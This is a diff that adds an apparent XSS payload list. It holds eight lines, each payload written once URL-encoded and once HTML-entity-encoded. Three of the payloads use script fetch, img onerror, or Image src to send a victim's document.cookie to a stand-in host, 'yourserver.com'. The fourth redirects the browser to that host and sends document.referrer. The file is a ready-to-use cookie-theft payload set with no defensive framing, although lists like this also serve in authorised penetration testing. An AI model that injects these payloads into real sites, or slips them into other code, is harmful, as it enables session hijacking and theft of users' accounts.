@@ -1,0 +1,8 @@
+%3Cscript%3Efetch%28%27http%3A//yourserver.com%3Fc%3D%27%2Bdocument.cookie%29%3C/script%3E
+&lt;script&gt;fetch(&#x27;http://yourserver.com?c=&#x27;+document.cookie)&lt;/script&gt;
+%3Cimg%20src%3Dx%20onerror%3D%27new%20Image%28%29.src%3D%22http%3A//yourserver.com%3Fc%3D%22%2Bdocument.cookie%27%3E
+&lt;img src=x onerror=&#x27;new Image().src=&quot;http://yourserver.com?c=&quot;+document.cookie&#x27;&gt;
+%3Cscript%3Evar%20i%3Dnew%20Image%3Bi.src%3D%27http%3A//yourserver.com/%27%2Bdocument.cookie%3C/script%3E
+&lt;script&gt;var i=new Image;i.src=&#x27;http://yourserver.com/&#x27;+document.cookie&lt;/script&gt;
+%3Cscript%3Elocation%3D%27http%3A//yourserver.com/%3Fref%3D%27%2Bdocument.referrer%3C/script%3E
+&lt;script&gt;location=&#x27;http://yourserver.com/?ref=&#x27;+document.referrer&lt;/script&gt;
